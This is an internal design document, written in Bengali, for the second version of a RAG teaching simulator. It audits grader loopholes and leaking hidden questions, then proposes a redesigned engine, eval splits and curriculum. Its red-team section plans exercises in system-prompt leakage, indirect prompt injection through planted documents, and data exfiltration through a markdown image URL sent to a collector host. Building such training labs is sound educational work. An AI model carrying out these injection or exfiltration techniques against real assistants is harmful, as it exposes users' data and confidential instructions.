# RAG Simulator v2: বাকি gap আর নতুন design

> **তারিখ:** ২০২৬-১১-১৭ · **Base:** `dev` @ `b674bed` (P0–P4 শেষ হওয়ার পরের অবস্থা)
> **আগের doc:** [rag-simulator-design-bn.md](rag-simulator-design-bn.md) (v1 design)। এই doc সেটার পরের ধাপ।

---

## ০. এক নজরে

P0–P4-এর পর UI আর fake ডেটা নিয়ে সমস্যা অনেক কমেছে। কিন্তু grader চালিয়ে দেখা গেছে, **২৮টা RAG exercise-এর ২৪টা পাঁচটা সহজ উত্তর দিয়েই pass করা যায়।**

| পরিবার | Exercise | যে একটা উত্তর সবগুলো pass করে | ফল |
|---|---|---|---|
| R1 (chunking) | 001, 005, 006, 007, 010, 026 | `{chunkSize 160, overlap 0, sentence}` | ৬/৬ pass |
| R2 (top-k / budget) | 002, 003-top-k, 008, 016, 017, 018, 025 | `{topK 3, rerank, chunkSize 50}` | ৭/৭ pass |
| R4 (rerank) | 004, 021, 022, 028, 030 | `{title-boost, topN 20, rewrite নেই}` | ৫/৫ pass |
| R3 (citation) | 003-citation, 027 | Prompt: `cite refuse` | ২/২ pass |
| Sandbox (Python) | 009, 023, 024, 029 | পুরো corpus-কে একটা passage হিসেবে ফেরত দেওয়া | ৪/৪ pass |

শুধু R5 (`rag-031`) আর Red Team-এর তিনটা level আলাদা কিছু চায়।

এর পাঁচটা মূল কারণ:
1. **R3-এর generation আসল না।** Learner-এর prompt-এ "cite" আর "refuse" শব্দ থাকলেই হলো। Model call হয়, কিন্তু তার উত্তর ফেলে দেওয়া হয়।
2. **একই পরিবারের exercise-গুলো একই hidden set আর corpus ব্যবহার করে।** R2/R4-এ ২১টার মধ্যে ২০টা প্রশ্ন সবখানে এক, R1-এ ৩০টার মধ্যে ২৯টা। তফাত শুধু threshold-এ, আর সেরা উত্তর সব threshold-ই পার হয়।
3. **Sandbox-এ passage-এর কোনো সীমা নেই।** তাই পুরো corpus ফেরত দিলেই recall 1.00।
4. **Engine-এ শুধু keyword (BM25) আছে।** Embedding আসলে hash থেকে বানানো (fake), reranker মানে title-এ শব্দ মিললে +৫০। তাই hybrid search, semantic search বা আসল reranking শেখানো যায় না।
5. **Hidden প্রশ্ন বের করে নেওয়া যায়।** প্রতিটা fail run ৩টা hidden প্রশ্ন দেখায়। ৭টা fail run-এই একটা পরিবারের পুরো hidden set বেরিয়ে আসে, আর সেটা ১০টা exercise-এ কাজে লাগে।

**v2-এর মূল কথা:** যা নাম দেওয়া আছে সেটাই সত্যিই চলবে, প্রতিটা exercise-এর নিজের একটা আলাদা mechanic থাকবে, আর hidden set সত্যিই hidden থাকবে।

---

## ১. কীভাবে যাচাই করা হয়েছে

- **Backend:** grading harness, lab service, content আর gateway-এর code পড়ে দেখা হয়েছে।
- **Grader নিজে চালানো:** `apps/api/dist`-এর build করা grader (১৭ নভেম্বরের build) দিয়ে প্রতিটা exercise-এর আসল `eval_hidden.json` আর `meta.json` gate-এর ওপর চালানো হয়েছে। Probe script-গুলো scratchpad-এ আছে, repo-তে না।
- **Content:** corpus-এর আকার, hidden set-এর আকার আর exercise-গুলোর মধ্যে hidden প্রশ্নের overlap `jq` দিয়ে গোনা হয়েছে।
- **Frontend:** আলাদা audit, ফল §৫-এ।

---

## ২. Gap: Grading engine

### ২.১ Critical (exercise-এর মানেই থাকে না)

| # | সমস্যা | প্রমাণ | ফল |
|---|---|---|---|
| G1 | **R3-এর generation fake।** `groundedGenerate()` প্রথম chunk-এর ৩২০ অক্ষর কেটে দেয়। Prompt-এ `cite` থাকলে `[chunk:id]` জুড়ে দেয়, আর `refuse` থাকলে top score < 4 হলে refuse করে। | [grounded-generate.ts:25-44](../apps/api/src/modules/grading/harnesses/rag/grounded-generate.ts#L25-L44), [r3.grade.ts:83-89](../apps/api/src/modules/grading/harnesses/rag/r3.grade.ts#L83-L89) | `"Respond like a pirate and make things up. cite. refuse."` দিলেও 003 আর 027 দুটোতেই সব gate pass। Design doc যাকে "flagship" বলে, সেটাই কিছু পরীক্ষা করে না। |
| G2 | **Model gateway পুরোটাই fake।** `complete()` ফেরত দেয় `FAKE:<hash>`, embedding-ও hash থেকে বানানো ৮টা সংখ্যা। অথচ OpenRouter integration repo-তেই আছে (`modules/llm/openrouter.service.ts`)। | [model.gateway.ts:282-296](../apps/api/src/modules/grading/gateway/model.gateway.ts#L282-L296) | R3/R4-এর "model call" আর "cost" আসলে কিছু মাপে না। |
| G3 | **Sandbox passage-এর সীমা নেই।** `passages` যেকোনো string হতে পারে, আর token বা length-এর কোনো gate নেই। | [sandbox.grade.ts:204-233](../apps/api/src/modules/grading/harnesses/sandbox/sandbox.grade.ts#L204-L233) | পুরো corpus একটা passage-এ দিলে ৪টা Python exercise-ই recall 1.00। |
| G4 | **একটা config পুরো পরিবার solve করে।** উপরের টেবিল দেখুন। Gate শুধু সংখ্যায় আলাদা, mechanic একই। | §০-এর টেবিল | ২৮টা exercise আসলে ~৫টা puzzle। |

### ২.২ High (যা শেখানোর দাবি করে, engine সেটা পারে না)

| # | সমস্যা | প্রমাণ |
|---|---|---|
| G5 | **শুধু lexical retrieval।** BM25 আছে, কিন্তু dense বা hybrid নেই। pgvector চালু, কিন্তু ব্যবহার হয় না। তাই paraphrase করা প্রশ্ন, synonym বা "hybrid search" শেখানো যায় না। | [retrieve.ts:65-111](../apps/api/src/modules/grading/harnesses/rag/retrieve.ts#L65-L111) |
| G6 | **Reranker আসলে title-এ keyword বোনাস** (প্রতিটা মিলে যাওয়া শব্দে +৫০)। Cross-encoder নেই। | [rerank.ts:4-21](../apps/api/src/modules/grading/harnesses/rag/rerank.ts#L4-L21) |
| G7 | **Chunking strategy-গুলো নামে আলাদা, কাজে না।** `recursive` আর `sentence` হুবহু একই code। `heading-aware` পুরো doc-কে এক chunk করে, কারণ corpus-এ কোনো heading নেই। Overlap অক্ষর ধরে কাটে, তাই শব্দের মাঝখানে ভাঙে। `rag-006-overlap-tune` overlap 0 দিয়েই pass করে। | [chunking.ts:46-52](../apps/api/src/modules/grading/harnesses/rag/chunking.ts#L46-L52), [chunking.ts:79](../apps/api/src/modules/grading/harnesses/rag/chunking.ts#L79) |
| G8 | **R4-এর query rewrite কোনো কাজে আসে না।** Rewrite-এর জন্য call হয় আর গোনা হয়, কিন্তু rewrite করা query ranking-এ ব্যবহার হয় না। ফলে rewrite শুধুই খরচ বাড়ায়। | [r4.grade.ts](../apps/api/src/modules/grading/harnesses/rag/r4.grade.ts) (rewrite loop) |
| G9 | **R5-এর router নিজে থেকেই সঠিক।** প্রতিটা প্রশ্নের class আগে থেকে দেওয়া, তাই routing নিজে শেখা হয় না। ভুল class-এ পাঠালে কী হয়, সেটাও কখনো দেখা যায় না। | [r5.grade.ts:116-123](../apps/api/src/modules/grading/harnesses/rag/r5.grade.ts#L116-L123) |
| G10 | **Failure class আসল ঘটনা দেখে আসে না, config দেখে আন্দাজ করা হয়।** R2-তে `topK ≥ 16` বা `chunkSize ≥ 400` হলে class বসে, অথচ এখনকার budget ৮০–৪০০ token, তাই এই সীমাগুলো আর প্রাসঙ্গিক না। R5-এর `policy-needs-rerank` সরাসরি উত্তরটাই বলে দেয়। | [r2.grade.ts:189-208](../apps/api/src/modules/grading/harnesses/rag/r2.grade.ts#L189-L208), [r5.grade.ts:267-287](../apps/api/src/modules/grading/harnesses/rag/r5.grade.ts#L267-L287) |

### ২.৩ Medium

- **Token আর cost আসল না।**
  - `estimateTokens` হলো অক্ষর ÷ ৪: [pricing.ts:9](../apps/api/src/modules/grading/gateway/pricing.ts#L9)।
  - RAG trace-এ `costEurMicros` সবসময় 0, আর `max_cost_eur` কোথাও enforce হয় না।
- **Class B advisory gate খালি placeholder।** সবসময় `actual: 0, passed: true` দেয়: [class-b.ts](../apps/api/src/modules/grading/judge/class-b.ts)। Scorecard-এ দেখালে বিভ্রান্তি তৈরি হয়।
- **Grader বাছাই হয় hardcode করা slug list দিয়ে**, `meta.graderArchetype` দিয়ে না: [exercises.constants.ts](../apps/api/src/modules/catalogue/exercises/exercises.constants.ts)। নতুন exercise যোগ করতে code বদলাতে হয়।
- **বাংলা query কাজ করে না।** Tokenizer শুধু `[a-z0-9]` রাখে, তাই বাংলা প্রশ্নের token শূন্য হয়: [retrieve.ts:29](../apps/api/src/modules/grading/harnesses/rag/retrieve.ts#L29)।
- **Canary চেক এক জায়গায় আলাদা।** R5 `isHiddenCanary()`-এর বদলে সরাসরি `'HIDDEN_EVAL'` string খোঁজে: [r5.grade.ts:122](../apps/api/src/modules/grading/harnesses/rag/r5.grade.ts#L122)।

---

## ৩. Gap: Eval set আর anti-cheat

| # | সমস্যা | বিস্তারিত |
|---|---|---|
| E1 | **Hidden set কয়েকটা exercise মিলে একটাই।** | R2/R4-এর ১০টা exercise-এ ২১টার মধ্যে ২০টা প্রশ্ন এক। R1-এর ৬টায় ৩০টার মধ্যে ২৯টা। একটা exercise-এ বের করা প্রশ্ন বাকি সবগুলোতে কাজে লাগে। |
| E2 | **Hidden প্রশ্ন বেরিয়ে আসে।** | Fail হলে ৩টা প্রশ্ন আর retrieve হওয়া লেখা দেখায়। `goldSpan` সরানো হয়, প্রশ্ন সরানো হয় না: [grades.service.ts:21-35](../apps/api/src/modules/practice/grades/grades.service.ts#L21-L35)। Sandbox-এ crash হলে `stderr`-এর ৪০০ অক্ষরও দেখায়। |
| E3 | **Grader পুরোটাই নিজের মেশিনে নকল করা যায়।** | Corpus `GET /rag-lab` দিয়ে পুরো পাওয়া যায়, BM25 সবার জানা, আর grader deterministic। E2-এর প্রশ্নগুলো হাতে থাকলে offline-এ সব config brute-force করা যায়। |
| E4 | **Corpus খুব ছোট।** | R1: ৮টা doc, মোট ২,২০০ অক্ষর (~৫৫০ token)। Shared corpus: ২৪টা doc, ~১২k অক্ষর। R5: ৩৫টা doc। Distractor, near-duplicate বা version conflict নেই। |
| E5 | **Lab endpoint-এ কোনো rate limit নেই।** | `preview` আর `estimate` login ছাড়াই খোলা। `target` login চায়, কিন্তু সীমা নেই। App-এ কোনো throttler নেই। প্রতিটা call-এ disk থেকে corpus পড়ে নতুন করে chunk করে: [rag-lab.service.ts](../apps/api/src/modules/catalogue/exercises/rag-lab.service.ts)। |
| E6 | **Red team-এর flag সবার জন্য এক, আর git-এ commit করা।** | `eval_hidden.json`-এ খোলা লেখা আছে। Prefix এখনো পুরনো `LABPATH{…}`, নতুন brand অনুযায়ী বদলায়নি। একজন writeup দিলেই সবার জন্য শেষ। |

---

## ৪. Gap: Red Team track

| # | সমস্যা | প্রমাণ |
|---|---|---|
| T1 | **Bot regex দিয়ে চলে।** RT1-এ জিততে হলে আক্রমণটা `DIRECT_INJECTION` regex-এর সাথে মিলতে হবে। ফলে role-play, encoding বা অনুবাদ-ধরনের সৃজনশীল আক্রমণ কাজ করে না, আর learner আসলে regex আন্দাজ করা শেখে। | [redteam.ts:51-52](../apps/api/src/modules/grading/harnesses/rag/redteam.ts#L51-L52) |
| T2 | **Bot আগের কথা মনে রাখে না।** প্রতিটা message আলাদা, তাই কয়েক ধাপে চালানো আক্রমণ সম্ভব না। | [redteam.ts:84-137](../apps/api/src/modules/grading/harnesses/rag/redteam.ts#L84-L137) |
| T3 | **RT2-এ learner নিজে কিছু ঢোকাতে পারে না।** Poisoned note আগে থেকেই corpus-এ আছে, আর Lab-এর Corpus tab-এ দেখা যায়। তাই কাজটা আসলে "লুকানো note খুঁজে বের করা", indirect injection-এর attacker হওয়া না। | `rag-102…/corpus.json` |
| T4 | **RT3-এর brief-এই উত্তর বলা।** Brief লেখে "Project Lighthouse launch notes … contain the flag", তাই এক query-তেই শেষ। | `rag-103…/meta.json` |
| T5 | **শুধু attack আছে।** Defense (blue team) নেই, আর flag পাওয়া ছাড়া অন্য কোনো score নেই। | — |

---

## ৫. Gap: UI / UX

নিচের path-গুলো `apps/web/src/` থেকে ধরা। High-severity দাবিগুলো আলাদা করে code খুলে মিলিয়ে দেখা হয়েছে।

### ৫.১ High

| # | সমস্যা | প্রমাণ |
|---|---|---|
| U1 | **Production brief-এ শুধু প্রথম অনুচ্ছেদ দেখায়।** Figma brief `briefMd`-এর প্রথম block থেকে goal বানায়, পুরো markdown কখনো render করে না। ফলে এগুলো হারিয়ে যায়: R3-এর `[chunk:<id>]` format, sandbox-এর `input.json` → `{results:[{id,passages}]}` contract, R4-এর rewrite খরচ, আর red team-এর "Target bot tab" নির্দেশনা। | `features/workspace/exercise-brief-sections.ts:77`, `components/brief-panel.tsx:215-235` |
| U2 | **Submit fail করলে (যেমন 429) আগের scorecard মুছে যায়।** `setGrade(null)` আর `setRun(null)` attempt শুরুর আগেই চলে। Attempt policy-তে আটকালে স্ক্রিনে আসে "No runs yet"। | `components/workspace-shell.tsx:236-238` |
| U3 | **Mobile আর tablet-এ config হারিয়ে যায়।** Submit → Lab → Submit করলে form আবার starter config-এ ফিরে যায়। Grade-এর পর নিজে থেকে Results-এ গেলে, বা 899px breakpoint পার হলেও একই হয়। | `components/workspace-demo-mobile.tsx:109-137`, `components/submission-surface.tsx:147-149` |
| U4 | **Run fail বা `killed_budget` হলে result pane ফাঁকা থাকে।** Error শুধু form-এ দেখায়। Learner তখন Lab tab-এ থাকলে কিছুই জানতে পারে না। | `components/run-panel.tsx:211,231-244` |
| U5 | **Sandbox-এ নিরাপদে চালিয়ে দেখার উপায় নেই।** Lab বন্ধ, starter code নেই, Tab দিয়ে indent হয় না। প্রতিটা পরীক্ষাই ঘণ্টায় ২০টার মধ্যে একটা graded submit খরচ করে। | `rag-lab.service.ts` (`labEnabled`), submission schema-য় default নেই |

### ৫.২ Medium

- **Attempt-এর হিসাব দেখা যায় না।** API `attemptPolicy` পাঠায়, কিন্তু web-এর `Exercise` type সেটা বাদ দেয়। "২০টার মধ্যে N বাকি" বা cooldown কখন শেষ, কোথাও লেখা নেই।
- **Red team chat মুছে যায়।** Lab tab বদলালে, বা flag submit করতে Configure-এ গেলে, transcript চলে যায়। Reset বাটন নেই। Bot আগের কথা মনে রাখে না, অথচ UI দেখতে chat-এর মতো, তাই বিভ্রান্তি হয়। Reply-এর newline-ও ভেঙে যায়।
- **Failing case card-এ তথ্য কম।**
  - API `retrieved` পাঠায়, কিন্তু card-এ দেখায় না।
  - শুধু প্রথম failure class দেখায়, তাও কাঁচা code হিসেবে, কোনো ব্যাখ্যা ছাড়া।
  - Sandbox-এর stderr-এ "gold hidden" ট্যাগ লাগানো থাকে।
- **Submission history-তে কাজের সুবিধা কম।** পুরনো config editor-এ ফিরিয়ে আনা যায় না। Diff ৩৭ অক্ষরে কেটে যায়, তাই prompt বা code-এর পরের দিকের পরিবর্তন দেখায় না।
- **Track তালিকা অসম্পূর্ণ।** `config/live-rag-problems.ts`-এ ২২টা slug, অথচ published ২৮টা। 025–030 নেই, তাই track-এর মোট সংখ্যা ভুল, আর ওগুলো pass করলে "Next" link আসে না।
- **Track progress সবসময় শূন্য দেখায়।** `RAG_TRACK_CLEARED = 0` hardcode করা, তাই সব row "not started": `problems/components/problems-rag-track-panel.tsx:11-31`।
- **Learner-কে developer-এর নির্দেশনা দেখানো হয়।** Worker বন্ধ থাকলে লেখা ওঠে "run npm run dev:worker", আর সতর্কবার্তাটা pass হওয়ার পরেও সরে না।
- **Contest mode-এ gate হারিয়ে যায়।** `toExercise` `gates` বাদ দেয়, তাই brief, budget meter আর lab-এ budget থাকে না: `contests/components/contest-workspace-shell.tsx:61-72`।
- **R5-এর হিসাব অসম্পূর্ণ।** Class অনুযায়ী (x/y) দেখায় না। Cost-quality chart R5 বাদ দেয়, আর lab-এ class অনুযায়ী estimate নেই।
- **Trace-এর লেখা ভুল।**
  - R2/R5-এ লেখে "k fixed", অথচ k learner নিজে বাছাই করে।
  - Red team trace চিরকাল লেখে "Retrieval detail is not available yet"।
- **Mobile-এ desktop-এর অনেক কিছু নেই:** budget meter, submission diff, chart আর পুরো brief।
- **Accessibility:** integer input আর select-এর কোনো accessible name নেই। Tab-এ `tabpanel`/`aria-controls` আর arrow key-এর support নেই।

### ৫.৩ Low

"Edited since last run" badge ভুল সময়ে জ্বলে-নেভে। Run শেষ হওয়ার পর grade আনার মাঝখানে আবার "Waiting for a worker…" দেখায়। ২–৩ মিনিট পর polling থেমে যায়, আর পরে আবার শুরু হয় না। "Solved in N attempts" ভুল গোনে। `inconclusive` দেখায় fail-এর রঙে। Budget meter error হলে কিছু না বলে লুকিয়ে যায়। Target console-এ "Acme Help" আর `LABPATH{…}` hardcode করা।

**Leak:** Frontend-এ কোনো flag বা hidden ডেটা পাওয়া যায়নি। Hidden প্রশ্ন বেরিয়ে আসার পথ শুধু failing case (§৩ E2)।

---

## ৬. Gap: Curriculum (যা একেবারেই নেই)

আসল RAG কাজে যা নিয়মিত লাগে, কিন্তু এখন কোনো exercise-এ নেই:

- **Hybrid search:** paraphrase করা প্রশ্নে dense search জেতে, SKU বা ID-ধরনের প্রশ্নে BM25 জেতে।
- **Metadata filter আর freshness:** একই policy-র পুরনো আর নতুন version, কোনটা আনতে হবে।
- **Multi-hop:** উত্তর দুটো আলাদা doc-এ ছড়ানো।
- **আসল query rewrite:** সংক্ষিপ্ত রূপ বা বানান ভুল ঠিক করে খোঁজা।
- **Context packing:** chunk-এর ক্রম, duplicate সরানো, compression।
- **আসল model দিয়ে faithfulness আর refusal।**
- **Eval-driven development:** learner নিজে eval set বানাবে।
- **বহুভাষিক retrieval:** বাংলা আর ইংরেজি মেশানো corpus।
- **Latency আর caching-এর trade-off।**

---

## ৭. v2 Design

### ৭.১ ছয়টা নীতি

1. **যা নাম দেওয়া আছে সেটাই চলবে।** "Rerank" মানে আসল reranker, "generation" মানে আসল model। কোনো জায়গায় simulator রাখতে হলে UI-তে স্পষ্ট লেবেল দিতে হবে।
2. **এক exercise, এক mechanic।** প্রতিটা exercise এমন একটা ব্যর্থতা দিয়ে বানানো হবে, যেটা শুধু ওই knob ঠিক করলেই সারে। CI-তে একটা **transfer test** থাকবে: exercise A-এর reference solution exercise B-তে অবশ্যই fail করবে।
3. **শেখার জন্য Dev set, যাচাইয়ের জন্য Test set।** Dev set-এ পুরো trace দেখা যাবে। Test set-এ শুধু মোট সংখ্যা, category আর failure class।
4. **Feedback আসবে আসল ঘটনা থেকে।** Failure class বের হবে trace থেকে (gold কোন rank-এ ছিল, কোথায় কাটা পড়ল), config দেখে আন্দাজ করে না।
5. **গোপন জিনিস প্রতিটা user-এর আলাদা।** Flag আর hidden subset প্রতিটা user-এর জন্য আলাদা হবে, তাই একজনের উত্তর আরেকজনের কাজে লাগবে না।
6. **আসল model, কিন্তু ফল স্থির।** Pinned model, temperature 0, structured output, আর cache। তাই একই submission আবার grade করলে একই verdict আসবে।

### ৭.২ Engine architecture

```
        ┌──────────── content build (CI, একবার) ─────────────┐
corpus ─► normalize ─► chunk variants (নির্দিষ্ট chunkSize × overlap)
                     ├► BM25 stats
                     └► embeddings (pinned open model) ─► index cache (file / pgvector)
        └─────────────────────────────────────────────────────┘

        ┌──────────── grade time (worker) ────────────────────┐
config ─► Chunker ─► Retriever ─► Filter ─► Reranker ─► Packer ─► Generator ─► Metrics
           │           │            │          │           │          │
           │       BM25|Dense|   metadata/  none|cross-  budget,   LLM, JSON
           │       Hybrid(α)     ACL/date   encoder|MMR  order,    {answer,
           │                                             dedupe    citations,
           │                                                       refused}
        └── প্রতিটা ধাপ trace event লেখে: input, output, score, token, ms ──┘
```

- **Chunk variant:** chunkSize-কে কয়েকটা নির্দিষ্ট মানে রাখতে হবে, যেমন ১০০/২০০/৩০০/৪০০/৬০০/৮০০ অক্ষর, আর overlap ০%/১০%/২০%। তাহলে প্রতিটা variant-এর embedding আগেই হিসাব করে রাখা যায়। আসল প্রজেক্টেও chunk size এভাবে কয়েকটা মানের মধ্যেই বাছাই হয়।
- **Embedding:** pinned open model (যেমন bge-small বা MiniLM ধরনের)। CI-তে একবার হিসাব হবে, আর worker শুধু cache পড়বে। Corpus ছোট থাকলে memory-তে রাখলেই চলে। ~১০ হাজার chunk ছাড়ালে pgvector।
- **Reranker:** ছোট cross-encoder, যার score `(query, chunk hash)` ধরে cache হবে। Title boost থাকবে, তবে "heuristic baseline" লেবেলে।
- **Generator:** আসল model (OpenRouter-এ pinned), সাথে JSON schema, যাতে উত্তরে থাকে `{answer, citations[], refused}`। Citation format, citation context-এর ভেতরে কিনা, gold span overlap আর refusal মাপা হবে এই structured output থেকে deterministic ভাবে। এর ওপরে calibrated judge থাকবে advisory হিসেবে, সংখ্যা সহ, placeholder না।
- **Tokenizer:** আসল tokenizer (pinned model-এরটা, বা cl100k-এর মতো কোনো স্থির tokenizer), আর price table থেকে cost হিসাব।
- **একটাই engine:** Lab preview, estimate আর grader একই engine function চালাবে। এখন অনেকটা এমনই আছে, এটা ধরে রাখতে হবে।

### ৭.৩ Eval design

| স্তর | কী থাকে | Learner কী দেখে |
|---|---|---|
| **Dev set** (public) | ১০–১৫টা প্রশ্ন, gold সহ | Lab-এ পুরো trace, gold চিহ্ন, প্রতিটা প্রশ্নে hit/miss। কোনো সীমা নেই। |
| **Feedback split** (hidden-এর ১/৩) | ≥১৫টা প্রশ্ন | Fail হলে প্রশ্ন আর retrieve হওয়া chunk-এর ID দেখায়, gold দেখায় না। |
| **Holdout split** (hidden-এর ২/৩) | ≥৩০টা প্রশ্ন | শুধু category অনুযায়ী মোট সংখ্যা ("paraphrase: 7/10")। প্রশ্ন কখনো দেখায় না। |

- **Pass করতে দুটো split-ই পার হতে হবে।** Kaggle-এর public/private leaderboard যেভাবে কাজ করে, অনেকটা সেরকম।
- **Hidden set প্রতিটা exercise-এর নিজের।** যেকোনো দুটো exercise-এর মধ্যে overlap ≤ ১০%। এটা CI-তে চেক হবে।
- **প্রতিটা প্রশ্নে tag থাকবে:** `lexical`, `paraphrase`, `multi-hop`, `numeric`, `unanswerable`, `stale-version`, `id-lookup`। Feedback-এ এগুলো category হিসেবে দেখাবে।
- **Per-user subset (ঐচ্ছিক):** ৬০টা প্রশ্নের pool থেকে প্রতিটা user-এর জন্য seed দিয়ে ৪০টা বাছাই করা। এতে উত্তর শেয়ার করা কঠিন হবে।
- **Lab endpoint:** login লাগবে, আর rate limit থাকবে (যেমন preview ৬০/মিনিট, target ৩০/মিনিট)। Corpus দেখানো যাবে, কারণ আসল কাজেও engineer নিজের ডেটা দেখতে পায়।

### ৭.৪ Curriculum v2: প্রতিটা exercise-এর আলাদা mechanic

| ID | Exercise | যে mechanic শেখায় | একটা config কেন সবখানে চলবে না |
|---|---|---|---|
| R1 | Chunk size vs budget | ছোট chunk মানে কম token, বড় chunk মানে বেশি recall | (রাখা হবে) |
| R1b | Overlap | Gold উত্তর দুই বাক্যের সীমানা জুড়ে থাকে, chunking fixed window | Overlap ছাড়া gold ভেঙে যায় |
| R1c | Structure-aware split | Markdown heading আর table আছে এমন corpus, আর আসল heading split | Sentence split করলে table ভেঙে যায় |
| R2 | Top-k vs budget | (রাখা হবে, একটাই exercise) | — |
| R2b | **Hybrid search** | Paraphrase প্রশ্নে dense লাগে, SKU প্রশ্নে BM25। Learner hybrid α বেছে নেয় | শুধু BM25 বা শুধু dense, কোনোটাতেই pass হয় না |
| R2c | **Metadata filter** | একই policy-র ২০২৪ আর ২০২৬ version, filter `effective_date` দিয়ে | Filter ছাড়া পুরনো version জিতে যায় |
| R2d | **আসল reranker** | এমন corpus যেখানে title বিভ্রান্ত করে, তাই cross-encoder লাগে | Title boost এখানে উল্টো ফল দেয় |
| R2e | Context packing | Near-duplicate সরানো আর ক্রম ঠিক করা ("lost in the middle") | Dedupe ছাড়া budget শেষ হয়ে যায় |
| R3 | **Citation contract (আসল model)** | Structured output, citation আর refusal | Keyword-ভর্তি prompt আর কাজ করবে না |
| R3b | Refusal calibration | Score threshold-এর knob আর prompt একসাথে | Threshold বেশি হলে over-refusal, কম হলে hallucination |
| R4 | **Query rewrite (আসলেই ব্যবহার হবে)** | প্রশ্নে সংক্ষিপ্ত রূপ আর বানান ভুল | Rewrite ছাড়া recall কম থাকে |
| R4b | Multi-hop | উত্তরের দুটো অংশ দুটো আলাদা doc-এ | একবার retrieve করলে একটা অংশ বাদ পড়ে |
| R5 | **Routing (learner নিজে router বানাবে)** | Rule লিখবে বা classifier threshold বেছে নেবে, ভুল জায়গায় পাঠালে খরচ আছে | Oracle router থাকবে না |
| R6 | বাংলা + ইংরেজি retrieval | Unicode tokenizer আর multilingual embedding | শুধু ASCII BM25 দিয়ে বাংলা প্রশ্নে কিছুই আসে না |
| Sandbox | Python retriever | প্রতিটা passage হতে হবে **একটা doc-এর টানা অংশ**, সাথে token budget (Phase A-তে করা হয়েছে) | পুরো corpus পাঠানোর exploit বন্ধ। Chunking-এর স্বাধীনতা learner-এর হাতেই থাকে |

**এখনকার clone exercise-গুলোর কী হবে:** ০০৮/০১৬/০১৮/০২১/০২২/০২৩/০২৪-এর slug path আর contest-এ ব্যবহার হচ্ছে। তাই slug রেখে content নতুন mechanic দিয়ে বদলানো যায় (যেমন ০১৮ → R2c freshness, ০২১ → R2b hybrid)। নতুন `version` দিয়ে publish করলে পুরনো attempt-এর ইতিহাস ঠিক থাকে।

### ৭.৫ Workspace UI v2

কাজের loop হবে চার ধাপের: **Build → Probe → Submit → Debrief**।

```
┌─ Brief ──────────┬─ Build ─────────────────────────────────────────┬─ Debrief ─────────────┐
│ Goal (১ লাইন)    │  Pipeline                                        │ Verdict: FAIL         │
│ Constraints      │  [Chunk]→[Index]→[Retrieve]→[Rerank]→[Pack]→[Gen] │ ─ Gates ───────────── │
│  • tokens ≤ 120  │   ●200ch   BM25    k=4      CE     120t    🔒    │ recall  0.86 / 0.95 ✗ │
│  • recall ≥ .95  │  (lock করা ধাপ ধূসর, fixed মান দেখায়)            │ tokens  97 / 120   ✓ │
│ Unlocked knobs   │ ┌ Stage inspector (যে ধাপ select করা) ──────────┐│ ─ Category ─────────── │
│ Hint ladder      │ │ Retrieve: k [4]  mode (BM25|Dense|Hybrid α .5) ││ paraphrase  6/10  ✗   │
│  ① free  ② -5%   │ │ "k বাড়ালে recall বাড়ে, token-ও বাড়ে"           ││ id-lookup  10/10 ✓    │
│  ③ -10%          │ └────────────────────────────────────────────────┘│ ─ Why (evidence) ──── │
│                  │  Probe: dev set (config বদলালেই আবার চলে)         │ gold rank 6–9 → k ছোট │
│                  │  q  │ tag   │ hit │ gold rank │ tok │ Δ আগের run    │ (৪টা feedback প্রশ্ন)  │
│                  │  d1 │ para  │ ✗   │ 7         │ 96  │ ▲ 3→7         │ ─ Run diff ─────────── │
│                  │  d2 │ id    │ ✓   │ 1         │ 88  │ =             │ #3 → #4: k 3→4        │
│                  │  [custom query ▸]                                   │ fixed 2, broke 0      │
│                  │  [ Submit to test set ] 17/20 left · resets 14:00   │ [Trace ▸] [Chart ▸]   │
└──────────────────┴─────────────────────────────────────────────────┴───────────────────────┘
```

- **Pipeline strip:** শুধু সেই ধাপগুলো থাকবে যা engine সত্যিই চালায়। Exercise যে ধাপ খুলে দেয় সেটা select করা যায়, বাকিগুলো lock করা।
- **Stage inspector:** একবারে শুধু select করা ধাপের knob দেখায়, প্রতিটার পাশে এক লাইনে trade-off লেখা।
- **Probe table:** budget meter এখানেই মিশে যাবে। আগের run-এর তুলনায় কোন প্রশ্ন ঠিক হলো আর কোনটা ভাঙল, দেখাবে।
- **Debrief:**
  - Holdout থেকে শুধু category অনুযায়ী সংখ্যা।
  - Feedback split থেকে প্রমাণ সহ কারণ, যেমন "gold rank 6–9", "gold chunk budget-এ কাটা পড়েছে", "boundary split"।
  - আগের run-এর তুলনায় পার্থক্য।
- **Trace drawer:** প্রতিটা প্রশ্নের জন্য ধাপে ধাপে waterfall: query → rewrite → candidates (score সহ) → filter → rerank (rank কত সরল) → packed context → উত্তর। প্রতিটা ধাপে token আর সময়।
- **Attempt/hint অর্থনীতি:** কয়টা submit বাকি আর কখন reset হবে, সবসময় দেখা যাবে। Hint ধাপে ধাপে খোলে, প্রতিটার নির্দিষ্ট score খরচ আছে।

### ৭.৬ Red Team v2

**Flag আর infra**
- **Dynamic flag:** `AIWARSS{<level>_<HMAC(secret, userId|slug)[:12]>}`। Target bot আর grader দুটোই এটা হিসাব করে। Flag আর git-এ থাকবে না। Secret থাকবে env-এ।
- **সীমা আর নজরদারি:** প্রতিটা user-এর message quota থাকবে (যেমন ঘণ্টায় ৬০টা)। কেউ কখনো target-এর সাথে কথা না বলেই সঠিক flag submit করলে সেটা সন্দেহজনক হিসেবে log হবে।
- **দুই স্তরের target:**
  - *Tier 1:* deterministic state machine। আগের কথা মনে রাখে, কয়েক ধরনের detector থাকে, আর কোন আচরণ ইচ্ছে করে দুর্বল রাখা হয়েছে সেটা লিখে রাখা।
  - *Tier 2:* আসল model (pinned, temperature 0, conversation hash ধরে cache)। দাম বেশি, তাই quota-ও কড়া।

**Level**

| Level | Attack | নতুন কী |
|---|---|---|
| RT1 | System prompt leak | Tier 2-এ সৃজনশীল আক্রমণ কাজ করবে। Defense স্তরে স্তরে কড়া হবে। |
| RT2 | **Indirect injection (learner নিজে doc লাগাবে)** | Learner shared wiki-তে একটা doc upload করবে। একটা simulated victim user নির্দিষ্ট সময়ে প্রশ্ন করবে, আর bot planted instruction মানলে flag বেরিয়ে আসবে। |
| RT3 | ACL post-filter leak | Brief থেকে উত্তর সরানো হবে। কোন project আছে, সেটা recon করে বের করতে হবে। |
| RT4 | Markdown image দিয়ে exfiltration | Bot `![](https://collector/?q=...)` render করে। Sim-এর ভেতরে একটা collector থাকবে, যেখানে leak হওয়া ডেটা দেখা যায়। |
| RT5 | Citation spoofing | ভুয়া source দিয়ে bot-কে ভুল citation দিতে বাধ্য করা। |

